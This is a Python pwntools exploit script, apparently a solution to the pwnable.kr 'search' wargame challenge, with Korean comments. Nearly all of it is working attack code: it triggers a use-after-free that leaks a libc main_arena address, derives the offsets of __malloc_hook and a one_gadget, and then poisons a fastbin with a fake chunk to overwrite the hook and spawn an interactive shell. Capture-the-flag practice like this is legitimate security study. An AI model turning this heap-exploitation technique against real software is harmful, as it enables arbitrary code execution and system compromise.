#!/usr/bin/python
from pwn import *

context(arch = 'i386', os = 'linux')
context.log_level = 'debug'
local = True

e = ELF("./search")
if local :
  s = process("./search")
else :
  s = remote("pwnable.kr", 9001)

lib = None
if local :
  lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else : 
  lib = ELF("./bf_libc.so")

#gdb.attach(s, "b* 0x400c63\nc\n")

s.recvuntil("Quit")

def searchn(m) :
  s.sendline("1")
  s.recvuntil("size:")
  s.sendline(str(len(m)))
  s.recvuntil("word:")
  s.sendline(m)
  s.recvuntil("Quit")

def searchy(m, m2) :
  s.sendline("1")
  s.recvuntil("size:")
  s.sendline(str(len(m)))
  s.recvuntil("word:")
  s.sendline(m)
  s.recvuntil("(y/n)?")
  s.sendline(m2)
  #s.recvuntil("Quit")

def index(m) :
  s.sendline("2")
  s.recvuntil("size:")
  s.sendline(str(len(m)))
  s.recvuntil("sentence:")
  s.sendline(m)

index("A" + " " + "A"*254)
searchy("A"*254, "y")
index("f")
searchy("f", "n")
re = s.recvuntil("(y/n)?") # main_arena + 88 주소 릭난다.
s.sendline("n")
addr = u64(re[0x64:0x64+8])

mal_hook = addr - 0x68
chunk_addr = mal_hook - 0x23
libc_base = mal_hook - 0x3c3b10
one_gadget = libc_base + 0xef6c4

index("a" + " " + "a" * 102)
index("b" + " " + "b" * 102)
index("c" + " " + "c" * 102)
searchy("a" * 102, "y")
searchy("b" * 102, "y")
searchy("c" * 102, "y")
searchy("\x80", "y")
index(p64(chunk_addr) + "a" * 96) #fd 위치에 fake chunk 주소를 넣는다
index("b" * 104) 
index("c" * 104)
index("d" * 104)
index("e" * (0x23 - 0x10) + p64(one_gadget) + "\x00" * (104 - 0x23 - 8 + 0x10)) # fastbin 사이즈를 맞춰주기 위해서

#index("ccc")
#searchy("ccc", "y")
#s.recvuntil("Quit")

s.interactive()


